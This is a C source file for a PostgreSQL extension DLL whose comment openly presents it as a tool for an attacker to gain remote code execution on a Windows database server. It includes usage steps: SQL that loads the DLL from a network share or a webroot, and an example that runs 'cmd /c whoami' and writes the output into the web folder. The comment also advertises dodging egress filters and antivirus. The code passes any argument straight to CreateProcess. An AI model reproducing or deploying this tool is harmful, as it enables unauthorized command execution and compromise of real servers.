/*

Usage:
This code (when compiled as a DLL) creates a PostgreSQL extension that registers a new function allowing an attacker to gain Remote Code execution on the server.
_________________

Use Cases:
Harsh egress filters blocking any initiated connection from the server to outside its zone.
Reverse Shell is not an option.

_________________

Features:
Can be loaded from a shared file over the network. (doesn't have to touch the disk)
If uploaded to disk, it's Antivirus friendly.

_________________

Usage Example:

1- Creaate the function on PostgreSQL:

From a shared file over the network:
CREATE FUNCTION Test(text) RETURNS void AS $$\\10.10.10.1\Shared-Folder\acmd.dll$$, $$connect_back$$ LANGUAGE C STRICT;

From a disk:
CREATE FUNCTION Test(text) RETURNS void AS $$C://inetpub//wwwroot//acmd.dll$$, $$connect_back$$ LANGUAGE C STRICT;


2. Execute the function with OS commands:
Example:
SELECT Test($$cmd /c whoami > C://inetpub//wwwroot//CommandOutput.txt$$);


*/

#include "postgres.h"
#include "utils/builtins.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

/* Add a prototype marked PGDLLEXPORT */
PGDLLEXPORT Datum connect_back(PG_FUNCTION_ARGS);
PG_FUNCTION_INFO_V1(connect_back);

STARTUPINFO sui;
PROCESS_INFORMATION pi;

Datum
connect_back(PG_FUNCTION_ARGS)
{

 /* convert text pointer to C string */
#define GET_STR(textp) \
    DatumGetCString(DirectFunctionCall1(textout, PointerGetDatum(textp)))

 CreateProcess(NULL, GET_STR(PG_GETARG_TEXT_P(0)), NULL, NULL, FALSE, 0, NULL, NULL, &sui, &pi);
 PG_RETURN_VOID();
}
